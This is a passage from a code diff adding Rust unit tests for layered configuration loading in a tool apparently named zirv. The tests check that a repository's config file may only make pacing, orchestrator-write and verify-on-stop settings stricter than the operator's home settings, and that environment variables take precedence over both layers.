+                "names the operator escape hatch: {message}"
+            );
+        }
+
+        // The operator's own env still sets every one of them.
+        let repo = tempfile::tempdir().expect("tempdir");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        let env = env_map(&[
+            ("ZIRV_CTX_PACE_COLLECTOR_MAX_AGE_SECS", "7200"),
+            ("ZIRV_CTX_PACE_ESTIMATOR", "false"),
+            ("ZIRV_CTX_PACE_COUNT_CACHE_READS", "true"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.pace.collector_max_age_secs, 7200);
+        assert!(!cfg.pace.estimator);
+        assert!(cfg.pace.count_cache_reads);
+    }
+
+    /// T9: the fold rule itself, pure and direct -- no config file, no env,
+    /// no `CtxConfig::load` involved. `narrow_pace_bool` mirrors `Stance::
+    /// max` (stricter wins regardless of layer); `narrow_pace_percent`
+    /// mirrors it for "lower is stricter" instead of "higher is stricter".
+    #[test]
+    fn the_pace_narrowing_fold_rule_favours_the_stricter_layer_either_direction() {
+        // enabled: true (stricter) wins no matter which layer set it.
+        assert!(narrow_pace_bool(true, None));
+        assert!(narrow_pace_bool(true, Some(false)), "repo may not weaken");
+        assert!(narrow_pace_bool(false, Some(true)), "repo may tighten");
+        assert!(!narrow_pace_bool(false, None), "both loose: stays loose");
+        assert!(!narrow_pace_bool(false, Some(false)));
+
+        // percent: lower (stricter) wins no matter which layer set it.
+        assert_eq!(narrow_pace_percent(90.0, None), 90.0);
+        assert_eq!(
+            narrow_pace_percent(70.0, Some(99.0)),
+            70.0,
+            "repo may not raise the ceiling above home's own"
+        );
+        assert_eq!(
+            narrow_pace_percent(99.0, Some(60.0)),
+            60.0,
+            "repo may lower it below home's own"
+        );
+    }
+
+    /// T9: `pace.enabled`/`max_percent`/`soft_percent` are deliberately NOT
+    /// on `REPO_FORBIDDEN` (unlike `use_credits`/`poll_*` right above) --
+    /// they fold like `[policy]` instead, so a repo checkout may narrow
+    /// (make pacing stricter) but never widen it. This table proves both
+    /// directions actually differ: a repo trying to weaken is silently
+    /// ineffective (not an error -- these keys were never forbidden), and a
+    /// repo trying to tighten actually lands.
+    #[test]
+    fn a_repo_layer_may_only_narrow_pace_enabled_max_percent_and_soft_percent() {
+        struct Case {
+            home: &'static str,
+            repo: &'static str,
+            want_enabled: bool,
+            want_max: f64,
+            want_soft: f64,
+        }
+        for case in [
+            // A repo trying to turn pacing OFF against an operator who left
+            // it at the (enabled) default must not succeed.
+            Case {
+                home: "",
+                repo: "[pace]\nenabled = false\n",
+                want_enabled: true,
+                want_max: 99.0,
+                want_soft: 80.0,
+            },
+            // A repo trying to RAISE the ceiling (weaken it) must not
+            // succeed -- the operator's tighter home value wins.
+            Case {
+                home: "[pace]\nmax_percent = 70.0\n",
+                repo: "[pace]\nmax_percent = 99.9\n",
+                want_enabled: true,
+                want_max: 70.0,
+                want_soft: 80.0,
+            },
+            // A repo LOWERING the ceiling below the operator's own value
+            // must succeed -- this is the legitimate "this repo is
+            // expensive, be more careful here" case the fold exists for.
+            Case {
+                home: "[pace]\nmax_percent = 99.0\n",
+                repo: "[pace]\nmax_percent = 60.0\n",
+                want_enabled: true,
+                want_max: 60.0,
+                want_soft: 80.0,
+            },
+            // Same for soft_percent, and a repo turning pacing back ON
+            // against an operator who explicitly disabled it -- narrowing
+            // is allowed to push stricter than home too, the same "repo may
+            // ratchet stricter than the operator configured" rule
+            // `policy::resolve` already uses.
+            Case {
+                home: "[pace]\nenabled = false\nsoft_percent = 90.0\n",
+                repo: "[pace]\nenabled = true\nsoft_percent = 50.0\n",
+                want_enabled: true,
+                want_max: 99.0,
+                want_soft: 50.0,
+            },
+            // No repo layer at all: home's own values, untouched.
+            Case {
+                home: "[pace]\nmax_percent = 55.0\n",
+                repo: "",
+                want_enabled: true,
+                want_max: 55.0,
+                want_soft: 80.0,
+            },
+        ] {
+            let home_dir = tempfile::tempdir().expect("tempdir");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
+            if !case.home.is_empty() {
+                std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
+                std::fs::write(home_dir.path().join(".zirv/ctx.toml"), case.home).expect("write");
+            }
+            let repo = tempfile::tempdir().expect("tempdir");
+            if !case.repo.is_empty() {
+                std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+                std::fs::write(repo.path().join(".zirv/ctx.toml"), case.repo).expect("write");
+            }
+            let empty = env_map(&[]);
+            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect("a repo narrowing pace.* must not be a load error");
+            assert_eq!(
+                cfg.pace.enabled, case.want_enabled,
+                "home={:?} repo={:?}",
+                case.home, case.repo
+            );
+            assert_eq!(
+                cfg.pace.max_percent, case.want_max,
+                "home={:?} repo={:?}",
+                case.home, case.repo
+            );
+            assert_eq!(
+                cfg.pace.soft_percent, case.want_soft,
+                "home={:?} repo={:?}",
+                case.home, case.repo
+            );
+        }
+    }
+
+    /// Issue #358 T8: the raw fold rule -- `Deny` is the strict end
+    /// regardless of which layer sets it, mirroring `narrow_pace_bool`'s own
+    /// "stricter wins" shape but for a three-way ladder instead of a bool.
+    #[test]
+    fn the_orchestrator_writes_narrowing_fold_favours_the_stricter_layer_either_direction() {
+        assert_eq!(
+            narrow_orchestrator_writes(OrchestratorWrites::Deny, None),
+            OrchestratorWrites::Deny
+        );
+        assert_eq!(
+            narrow_orchestrator_writes(OrchestratorWrites::Deny, Some(OrchestratorWrites::Allow)),
+            OrchestratorWrites::Deny,
+            "repo may not weaken"
+        );
+        assert_eq!(
+            narrow_orchestrator_writes(OrchestratorWrites::Allow, Some(OrchestratorWrites::Deny)),
+            OrchestratorWrites::Deny,
+            "repo may tighten"
+        );
+        assert_eq!(
+            narrow_orchestrator_writes(OrchestratorWrites::Allow, None),
+            OrchestratorWrites::Allow,
+            "both loose: stays loose"
+        );
+        assert_eq!(
+            narrow_orchestrator_writes(OrchestratorWrites::Advise, Some(OrchestratorWrites::Allow)),
+            OrchestratorWrites::Advise,
+            "repo asking for looser than home is ignored"
+        );
+    }
+
+    /// The default, unconfigured behaviour: `advise`, not `deny` -- the
+    /// posture change this task exists to make (issue #358 T8).
+    #[test]
+    fn orchestrator_writes_defaults_to_advise() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(
+            cfg.supervise.orchestrator_writes,
+            OrchestratorWrites::Advise
+        );
+        assert_eq!(cfg.prompt.orchestrator_writes, OrchestratorWrites::Advise);
+    }
+
+    /// A repo `ctx.toml` layer may only narrow this key end to end through
+    /// `CtxConfig::load`, mirroring `a_repo_layer_may_only_narrow_pace_
+    /// enabled_max_percent_and_soft_percent` above.
+    #[test]
+    fn a_repo_layer_may_only_narrow_orchestrator_writes() {
+        struct Case {
+            home: &'static str,
+            repo: &'static str,
+            want: OrchestratorWrites,
+        }
+        for case in [
+            Case {
+                home: "",
+                repo: "[supervise]\norchestrator_writes = \"deny\"\n",
+                want: OrchestratorWrites::Deny,
+            },
+            Case {
+                home: "[supervise]\norchestrator_writes = \"deny\"\n",
+                repo: "[supervise]\norchestrator_writes = \"allow\"\n",
+                want: OrchestratorWrites::Deny,
+            },
+            Case {
+                home: "[supervise]\norchestrator_writes = \"allow\"\n",
+                repo: "",
+                want: OrchestratorWrites::Allow,
+            },
+        ] {
+            let home_dir = tempfile::tempdir().expect("tempdir");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home_dir.path());
+            if !case.home.is_empty() {
+                std::fs::create_dir_all(home_dir.path().join(".zirv")).expect("mkdir");
+                std::fs::write(home_dir.path().join(".zirv/ctx.toml"), case.home).expect("write");
+            }
+            let repo = tempfile::tempdir().expect("tempdir");
+            if !case.repo.is_empty() {
+                std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+                std::fs::write(repo.path().join(".zirv/ctx.toml"), case.repo).expect("write");
+            }
+            let empty = env_map(&[]);
+            let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect("a repo narrowing supervise.orchestrator_writes must not be a load error");
+            assert_eq!(
+                cfg.supervise.orchestrator_writes, case.want,
+                "home={:?} repo={:?}",
+                case.home, case.repo
+            );
+        }
+    }
+
+    /// `ZIRV_CTX_SUPERVISE_ORCHESTRATOR_WRITES` is the operator's own final
+    /// word, same as every other `ENV_MAP` entry -- it wins over both the
+    /// home and repo layers regardless of what either says.
+    #[test]
+    fn orchestrator_writes_env_var_wins_over_both_layers() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[supervise]\norchestrator_writes = \"deny\"\n",
+        )
+        .expect("write");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            home.path().join(".zirv/ctx.toml"),
+            "[supervise]\norchestrator_writes = \"deny\"\n",
+        )
+        .expect("write");
+        let env = env_map(&[("ZIRV_CTX_SUPERVISE_ORCHESTRATOR_WRITES", "allow")]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.supervise.orchestrator_writes, OrchestratorWrites::Allow);
+    }
+
+    /// Serde round-trips through the documented lowercase strings, not Rust's
+    /// own `Debug`/variant-name casing.
+    #[test]
+    fn orchestrator_writes_serializes_as_lowercase_strings() {
+        for (value, text) in [
+            (OrchestratorWrites::Allow, "\"allow\""),
+            (OrchestratorWrites::Advise, "\"advise\""),
+            (OrchestratorWrites::Deny, "\"deny\""),
+        ] {
+            assert_eq!(serde_json::to_string(&value).expect("serialize"), text);
+            let parsed: OrchestratorWrites = serde_json::from_str(text).expect("deserialize");
+            assert_eq!(parsed, value);
+        }
+    }
+
+    /// Issue #309: the fold rule itself, pure and direct -- the same
+    /// no-config-file, no-`CtxConfig::load` shape as
+    /// `the_pace_narrowing_fold_rule_favours_the_stricter_layer_either_direction`.
+    #[test]
+    fn the_verify_on_stop_narrowing_fold_rule_favours_the_stricter_layer_either_direction() {
+        // enabled: false (stricter, the feature is off) wins no matter which
+        // layer set it.
+        assert!(narrow_verify_on_stop_enabled(true, None));
+        assert!(
+            !narrow_verify_on_stop_enabled(false, Some(true)),
+            "repo may not re-enable an operator-disabled feature"
+        );
+        assert!(
+            !narrow_verify_on_stop_enabled(true, Some(false)),
+            "repo may disable it"
+        );
+        assert!(narrow_verify_on_stop_enabled(true, Some(true)));
+
+        // max_nudges: lower (stricter) wins no matter which layer set it.
+        assert_eq!(narrow_max_nudges(2, None), 2);
+        assert_eq!(
+            narrow_max_nudges(2, Some(10)),
+            2,
+            "repo may not raise the cap above home's own"
+        );
+        assert_eq!(
+            narrow_max_nudges(5, Some(1)),
             1,
             "repo may lower it below home's own"
         );
